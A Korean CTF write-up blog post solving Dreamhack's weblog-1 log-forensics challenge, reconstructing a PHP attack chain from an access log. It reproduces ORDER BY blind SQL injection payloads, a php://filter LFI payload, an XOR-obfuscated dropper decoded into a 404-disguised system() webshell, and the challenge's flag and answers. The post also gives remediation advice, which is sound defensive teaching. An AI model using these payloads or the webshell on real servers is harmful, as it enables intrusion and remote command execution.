---
layout: post
title:  "Dreamhack 워게임 weblog-1 풀이 — Apache access.log만 보고 공격자의 전체 킬체인 재구성하기"
date:   2026-05-15 02:30:00 +0900
categories: security web wargame dreamhack writeup logs forensics sqli lfi
---

## 들어가며

이번 글은 Dreamhack 웹해킹 워게임 **weblog-1** 풀이입니다. 다른 문제들과 결이 좀 다릅니다. **직접 익스플로잇을 짜는 것이 아니라, 이미 일어난 공격의 access.log 와 취약 소스 코드를 보고 5문제짜리 퀴즈에 답하는 형식** 입니다. 즉, **블루팀/포렌식 시점** 의 문제죠.

문제 설명도 단순합니다.

> 주어진 코드와 로그를 분석해 주어진 질문에 해당하는 답을 찾아보세요.

VM에 접속하면 다음 5문제가 순차적으로 등장합니다.

1. 공격자에게 탈취된 admin 계정의 PW
2. 공격자가 config.php 코드를 추출하는 데 사용한 페이로드
3. LFI 취약점을 통해 코드 실행 공격에 사용된 파일의 전체 경로
4. 생성된 웹쉘의 경로
5. 생성된 웹쉘을 통해 가장 처음으로 실행된 명령어

각 답을 맞히면 다음 문제로, 5문제를 모두 풀면 flag 가 출력됩니다. 이 글에서는 access.log 한 파일에서 어떻게 다음 5가지 답을 모두 추출하는지를 따라갑니다.

> 최종 flag: `DH{264495d5dc70c84d7bd740dd2d1a1709}`

## 1. 자료 둘러보기

ZIP 안 파일 구조:

```
weblog-1/
├── access.log            ← 핵심. 20,664 줄
└── src/
    ├── index.php
    ├── login.php
    ├── logout.php
    ├── config.php
    ├── board.php
    ├── write.php
    ├── uploads/index.html
    └── admin/
        ├── index.php
        ├── memo.php
        └── users.php
```

소스 코드에서 가장 먼저 찾아야 할 것은 **취약점이 어디 있는지** 입니다. 그래야 로그를 읽을 때 "공격자가 이쪽을 쳤겠구나" 라는 가설을 가지고 볼 수 있습니다.

### 1-1. 취약점 카탈로그 만들기

```php
// board.php 39~48 줄
$sql = "SELECT * FROM board ";
if(isset($_GET['search'])){
  $search = mysqli_real_escape_string($conn, $_GET['search']);
  $sql .= "Where title like '%${search}%' ";
}
if(isset($_GET['sort']) && $_GET['sort'] != "" ){
  $sql .= "order by ". $_GET['sort'];     // ★ sort 파라미터 — escape 없음!
}else{
  $sql .= "order by idx asc";
}
```

`search` 는 `mysqli_real_escape_string` 으로 escape 되지만 **`sort` 는 raw concat**. `ORDER BY` 절 SQL 인젝션 즉시 후보.

```php
// admin/index.php 37~46 줄
if($level[$_SESSION['level']] !== "admin") { die("Only Admin !"); }
if(isset($_GET['page'])){
    include $_GET['page'];        // ★ LFI/RFI — 사용자 입력을 include
}
```

세션 레벨이 `admin` 이면 임의 파일 include 가능. 게다가 `include` 는 PHP 래퍼(`php://`)를 지원하므로 **소스 코드 노출과 코드 실행** 모두 가능.

```php
// admin/memo.php 5~11 줄
if(isset($_GET['memo'])){
    $_SESSION['memo'] = $_GET['memo'];   // ★ 사용자 입력 → 세션 파일에 저장
}
if(isset($_SESSION['memo'])){
    echo($_SESSION['memo']);
}
```

PHP 의 세션은 파일 시스템(`/var/lib/php/sessions/sess_<id>`)에 직렬화되어 저장됩니다. 즉 사용자 입력이 **파일에 쓰여집니다**. 이 파일을 위의 LFI 로 include 하면 = **RCE**.

이 3개를 묶으면 다음과 같은 **킬체인** 이 자연스럽게 떠오릅니다.

```
①  board.php?sort= SQLi   →  users 테이블의 admin 비밀번호 탈취
②  admin 으로 로그인
③  admin/?page=php://filter/...resource=../config.php  →  소스 코드 노출
④  admin/?page=memo.php&memo=<?php ... ?>  →  PHP 코드를 세션 파일에 기록
⑤  admin/?page=/var/lib/php/sessions/sess_<my-sid>  →  세션 파일 include = RCE
⑥  RCE 로 /var/www/html/uploads/images.php 같은 웹쉘 파일 작성
⑦  /uploads/images.php?c=명령어 — 영구 셸 사용
```

이 그림을 머릿속에 그려두고 로그를 보면, 어느 줄이 어느 단계에 해당하는지가 한눈에 보입니다.

## 2. Q1 — admin 비밀번호 탈취

### 2-1. 로그에서 ORDER BY 인젝션 흔적 찾기

```bash
grep "board.php" access.log | grep "sort=" | head
```

```
09:09:39  ?sort=idx desc                       → 200 / 782
09:09:43  ?sort=idx asc                        → 200 / 782
09:09:49  ?sort=1 asc                          → 200 / 783
09:09:52  ?sort=99 asc                         → 500 / 1134   ← 컬럼 인덱스 초과 시 에러
09:10:05  ?sort=if(1=1, (select 1 union select 2), 0)   → 500
09:10:09  ?sort=if(1=0, (select 1 union select 2), 0)   → 200
```

`(select 1 union select 2)` 는 2개의 행을 반환합니다. ORDER BY 가 스칼라 서브쿼리를 기대하므로, 2행 결과가 들어오면 **"Subquery returns more than 1 row"** 에러 → HTTP 500. 즉 다음과 같이 동작합니다.

| if() 조건 | 결과 | 응답 |
|----------|------|------|
| 참 | 서브쿼리 실행 → 행 2개 → ORDER BY 에러 | 500 |
| 거짓 | 0 → ORDER BY 0 → 정상 | 200 |

공격자는 이걸로 1bit-at-a-time 추론을 합니다.

### 2-2. 추출 시퀀스 자동 디코딩

```bash
grep "board.php" access.log | grep "sort=if" | awk '$9 == 500'
```

500 응답이 149 개 잡힙니다. 각 줄을 파싱해 `(expr, position, char)` 를 모으면 평문이 복원됩니다.

```python
import re, urllib.parse
from collections import defaultdict

groups = defaultdict(dict)  # expr → {position: char}

for line in open('access.log'):
    if ' 500 ' not in line: continue
    m = re.search(r'sort=([^ ]+) HTTP', line)
    if not m: continue
    q = urllib.parse.unquote(m.group(1))
    m2 = re.search(r'if\(ord\(substr\((.+?),\s*(\d+),1\)\)=(\d+)', q)
    if not m2: continue
    expr, pos, n = m2.group(1), int(m2.group(2)), int(m2.group(3))
    groups[expr][pos] = chr(n)

for k, v in groups.items():
    s = ''.join(v[i] for i in sorted(v.keys()))
    print(f'{k!r}\n  → {s!r}\n')
```

출력:

```
'database()'
  → 'simple_board'

'(select group_concat(TABLE_NAME,0x3a,COLUMN_NAME) ...
                            ... TABLE_SCHEMA=database())'
  → 'board:idx,board:title,board:contents,board:writer,
     users:idx,users:username,users:password,users:level'

'(select group_concat(username,0x3a,password) from users)'
  → 'admin:Th1s_1s_Adm1n_P@SS,guest:guest'
```

**Q1 답: `Th1s_1s_Adm1n_P@SS`** ✓

## 3. Q2 — config.php 추출 페이로드

admin 으로 로그인한 직후의 트래픽을 좁혀서 보면 LFI 시도가 보입니다.

```bash
grep "admin/?page=" access.log | head -15
```

```
09:53:33  ?page=../../../../../etc/passwd                                → 200 / 1171
09:53:43  ?page=php://filter/convert.base64-encode/resource=index.php    → 200 / 1554
09:53:59  ?page=php://filter/convert.base64-encode/resource=../index.php → 200 / 1384
09:54:18  ?page=php://filter/convert.base64-encode/resource=../config.php→ 200 /  986
09:54:38  ?page=php://filter/convert.base64-encode/resource=users.php    → 200 / 1202
09:54:44  ?page=php://filter/convert.base64-encode/resource=memo.php     → 200 / 1185
```

`include $_GET['page']` 에 `php://filter/convert.base64-encode/resource=...` 를 넣으면 PHP 가 그 파일을 base64 로 인코딩한 결과를 응답에 박아 줍니다. **PHP 의 클래식 소스 노출 기법** 입니다.

**Q2 답: `php://filter/convert.base64-encode/resource=../config.php`** ✓

> 왜 `../config.php` 인가? include 의 working directory 가 `admin/` 이므로 한 단계 위로 올라가 config.php 를 가리킨다.

## 4. Q3 — 코드 실행에 사용된 파일

LFI 로 코드 실행을 하려면, 공격자 입력이 실제 파일로 어딘가에 들어가 있어야 합니다. 여기서 `admin/memo.php` 가 황금티켓입니다.

```php
if(isset($_GET['memo'])){
    $_SESSION['memo'] = $_GET['memo'];   // 세션에 기록
}
```

PHP 세션은 `/var/lib/php/sessions/sess_<sid>` 파일에 직렬화되어 저장됩니다. 즉 공격자가 `?memo=<?php evil ?>` 을 보내면 그 PHP 코드가 디스크에 쓰입니다. 그 파일을 LFI 로 include 하면 그 자리에서 코드가 실행됩니다.

로그에서:

```
09:55:16  /admin/?page=memo.php&memo=<?php function m($l,$T=0){...} ... ?>
09:55:39  /admin/?page=/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732
```

09:55:16 에 세션 파일에 PHP 페이로드를 쓰고, 09:55:39 에 그 세션 파일을 include 합니다.

**Q3 답: `/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732`** ✓

## 5. Q4 — 생성된 웹쉘의 경로

`?memo=...` 의 PHP 페이로드를 풀어 보면 무엇을 하는지가 보입니다. URL 디코딩 후:

```php
<?php
function m($l,$T=0){
    $K = date('Y-m-d');
    $_ = strlen($l);
    $__ = strlen($K);
    for($i=0;$i<$_;$i++){
        for($j=0;$j<$__;$j++){
            if($T) { $l[$i] = $K[$j] ^ $l[$i]; }
            else   { $l[$i] = $l[$i] ^ $K[$j]; }
        }
    }
    return $l;
}
m('bmha[tqp[gkjpajpw')(
    m('+rev+sss+lpih+qthke`w+miecaw*tlt'),
    m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?')
);
?>
```

`m()` 은 **`date('Y-m-d')` 의 모든 글자를 XOR 한 단일 바이트** 로 입력 문자열을 한 번씩 XOR 하는 함수입니다. 즉, 키 한 글자만 알면 디코딩 가능합니다.

로그에서 페이로드가 실행된 시간은 **2020-06-02**. 이 날짜 각 글자의 XOR 누적값을 계산하면 `0x04`.

```python
key_xor = 0
for c in '2020-06-02':
    key_xor ^= ord(c)
print(hex(key_xor))   # → 0x04
```

각 인자를 `0x04` 와 XOR 하면 평문이 나옵니다.

```python
def m(s, k=0x04):
    return ''.join(chr(ord(c) ^ k) for c in s)

print(m('bmha[tqp[gkjpajpw'))                                 # file_put_contents
print(m('+rev+sss+lpih+qthke`w+miecaw*tlt'))                  # /var/www/html/uploads/images.php
print(m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?'))
# <?php header("HTTP/1.1 404 Not Found");system($_GET["c"]);
```

즉 실행된 PHP 는 결국 다음과 같습니다.

```php
file_put_contents(
  "/var/www/html/uploads/images.php",
  '<?php header("HTTP/1.1 404 Not Found");system($_GET["c"]);'
);
```

웹쉘이 `images.php` 라는 이름으로 `/uploads/` 안에 떨어졌습니다. 그리고 **호출될 때마다 HTTP 404 헤더를 먼저 설정** 하므로, 액세스 로그에서 본 모든 `/uploads/images.php` 응답이 **404 로 보이는** 이유까지 깔끔하게 설명됩니다.

**Q4 답: `/var/www/html/uploads/images.php`** ✓

## 6. Q5 — 최초 실행 명령어

로그에서 `/uploads/images.php` 로 들어온 요청을 시간순으로 보면:

```bash
grep "uploads/images.php" access.log | head -5
```

```
09:56:32  /uploads/images.php?c=whoami           → 404 / 490
09:57:04  /uploads/apple.php?c=ls%20-al          → 404 / 490   (오타: 이건 images.php가 아님)
09:57:17  /uploads/session.php?cmd=echo%20...    → 404         (다른 파일)
...
```

`/uploads/images.php?c=whoami` 가 9시 56분 32초로 가장 앞.

> 함정: 로그 위에서 보면 `/uploads/memo.php?c=ls`, `/uploads/admin.php?c=id` 같은 요청들이 **앞서 등장** 합니다. 하지만 이들은 진짜 웹쉘이 `images.php` 라는 사실을 모른 채 공격자가 **추측으로 다른 이름들도 시도해 본 흔적** 입니다. 모두 진짜 404 (파일 없음). Q4 에서 결정한 정확한 파일명 `/uploads/images.php` 만으로 grep 해야 진짜 첫 실행이 나옵니다.

**Q5 답: `whoami`** ✓

## 7. flag 수확

5문제를 모두 풀면 페이지에 출력됩니다.

```
Flag is DH{264495d5dc70c84d7bd740dd2d1a1709}
Q: ALL SOLVE!!
```

## 8. 취약점 해설 — 한 페이지로 정리하는 PHP 클래식

이 문제가 다루는 4가지는 모두 PHP/MySQL 환경에서 가장 자주 보는 클래식입니다.

### 8-1. ORDER BY SQL 인젝션

`ORDER BY` 절에는 `?`-바인딩(prepared statement)을 쓸 수 없기 때문에, 많은 개발자가 무심코 raw concat 을 합니다. 방어:

- `sort` 같은 파라미터는 **화이트리스트**(예: `idx`, `title`, `writer` 만 허용).
- 또는 인덱스 번호만 받고, 코드에서 컬럼명으로 매핑.

```php
$allowed = ['idx', 'title', 'writer'];
$sort = in_array($_GET['sort'], $allowed) ? $_GET['sort'] : 'idx';
$sql .= " order by $sort";
```

### 8-2. `include`-기반 LFI/RFI

`include $_GET['page']` 패턴은 PHP 의 영원한 1티어 버그입니다. 거의 항상 다음 3가지 변형이 가능합니다.

1. 임의 경로 포함 → 소스 노출
2. `php://filter` 로 base64 인코딩된 소스 노출
3. 디스크 어딘가에 PHP 코드를 쓸 수 있다면 → include 로 RCE

방어:

- 절대로 사용자 입력을 `include` 인자로 받지 말 것.
- 어쩔 수 없다면 **strict 화이트리스트** 만:

```php
$pages = ['users' => 'users.php', 'memo' => 'memo.php'];
$page = $pages[$_GET['page']] ?? null;
if ($page) { include __DIR__ . '/' . $page; }
```

### 8-3. PHP 세션 파일을 통한 코드 주입

PHP 세션 파일 위치(`session.save_path`) 가 LFI 로 도달 가능한 곳에 있고, 세션에 사용자 제어 데이터가 들어간다면 **언제나 RCE 후보** 입니다. 방어:

- 세션 저장소를 **Redis / Memcached** 같은 외부 KV 로 (디스크 파일 자체를 없앤다).
- `session.serialize_handler = php_serialize` 로 두면 세션 파일은 serialize 형식이라 그대로 PHP 로 include 해도 코드가 안 됨. 디폴트(`php` handler) 가 가장 위험.
- 세션에 사용자 입력 원본을 그대로 저장하지 않기.

### 8-4. 404 위장 웹쉘

```php
<?php header("HTTP/1.1 404 Not Found"); system($_GET["c"]); ?>
```

이 한 줄짜리 패턴은 SOC/WAF 우회용으로 매우 흔합니다. **응답 상태코드만 보고 "404 니까 안전" 으로 분류하는 모든 자동화는 이걸 놓칩니다.**

방어 측면에서는

- **응답 바디 길이** 도 함께 보아야 한다(`404 + 큰 바디` 가 의심).
- 405/404 응답 중에서 **referer 가 없고 user-agent 가 자동화 도구인 패턴** 을 별도로 룰화.
- File integrity monitoring(파일 시스템 모니터링) 으로 `uploads/` 같은 디렉터리에 **새 `.php` 파일이 생기는 순간 알림** — 이게 가장 강력하다.

## 9. 정리 — 입문자가 가져갈 교훈

- **소스 코드와 로그를 같이 보면, 공격자의 모든 사고 흐름이 그대로 드러난다.** 디펜더의 가장 강력한 무기는 "둘 다 보는 시각" 이다.
- 로그에서 **상태 코드(2xx/4xx/5xx) 와 응답 크기** 의 분포는 이미 강력한 시그널. 같은 URL 의 응답 크기가 다른 줄은 모두 따로 떼서 보자.
- **공격자가 추측으로 시도한 잘못된 경로들** 도 흔적에 남는다. 진짜 정답을 찾았다면 그 흔적은 무시해도 된다 — 단, 진짜 정답을 모르는 상태에서는 추측 경로를 보고 헷갈리기 쉽다. 코드를 먼저 읽고 가설을 세운 뒤 로그를 보는 순서를 유지하자.
- ORDER BY SQLi 의 `if(cond, (select 1 union select 2), 0)` 패턴은 한 번 익혀두면 즉시 디코딩 가능하다. **상태 코드 500 vs 200** 한 비트로 1글자.
- `php://filter/convert.base64-encode/resource=` 는 PHP LFI 의 단골. include 가 보이는 순간 이 페이로드부터 시도/의심.
- "세션 파일 + LFI = RCE" 는 PHP 패턴 사전의 1번 항목. 외워두자.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. Q5 에서 처음 grep 을 너무 넓게

처음에 `grep uploads access.log | head` 로 잡았더니 `/uploads/memo.php?c=ls`, `/uploads/admin.php?c=id` 같은 줄들이 더 위에 보였습니다. 이걸 보고 잠시 "어? 가장 처음 실행된 명령어가 `ls` 인가?" 하고 헷갈렸습니다.

**회고**: Q4 에서 결정한 정확한 파일명(`/uploads/images.php`) 으로만 grep 해야 합니다. 다른 파일명 시도들은 공격자의 **추측 흔적** 일 뿐이고 실제 셸은 그 파일에 없었습니다. 로그 분석의 첫째 원칙: **이전 단계에서 확정된 사실을 다음 단계의 필터로 사용** 한다. 그 사실을 활용하지 않으면 노이즈에 잡아 먹힙니다.

### 실패 2. 웹쉘 응답 코드가 404 라서 잠깐 "공격 실패" 로 오해

로그 어디를 봐도 `/uploads/*.php?c=...` 가 모두 404 만 떨어집니다. "공격이 실패한 흔적이 잔뜩 남은 로그를 분석시키는 문제구나" 라고 처음에 잘못 결론지을 뻔했습니다.

**회고**: 웹쉘 페이로드를 끝까지 디코딩하기 전까지는 "성공/실패" 단정 짓지 말 것. XOR 디코딩 결과의 첫 줄 `header("HTTP/1.1 404 Not Found")` 를 본 순간 모든 게 맞아 떨어졌습니다. **응답 코드만 보고 SOC 가 자주 놓치는 함정** 이고, 이 문제는 그 함정을 정확히 재현합니다.

### 실패 3. XOR 키를 잘못 계산할 뻔

`m()` 함수의 이중 for 루프를 처음에 "각 글자별로 키 한 글자씩 XOR" 로 잘못 해석하면 디코딩이 망가집니다. 실제로는 `$l[$i] = $l[$i] ^ $K[0] ^ $K[1] ^ ... ^ $K[n-1]` — **한 글자에 키의 모든 바이트가 누적 XOR** 됩니다. 다행히 PHP 코드를 줄 단위로 정독하면서 의미를 분명히 잡은 뒤 디코딩 코드를 짰습니다.

**회고**: 난독화된 페이로드를 디코딩할 때는 **언어의 시맨틱대로 한 번 손으로 트레이스** 한 뒤 코드를 짜야 한다. "느낌으로 비슷한 디코딩" 을 짜면 한참을 헤매기 쉽다.

### 실패 4. 그 외(앞 문제에서 이어지는 일반론)

- VM 부팅이 60~90 초 걸리는 점은 이번에도 동일. 좋은 점: **첫 시도부터 정확히 한 번만 클릭** 하고 동안 소스 코드 읽기에 집중하면 시간 손실이 거의 없다.
- 로그 분석 문제는 직접 익스플로잇하는 문제와 다르게 **외부 서버에 요청을 보낼 일이 거의 없다.** 모든 작업이 로컬에서 끝나므로 가장 안정적이고 빠른 카테고리.
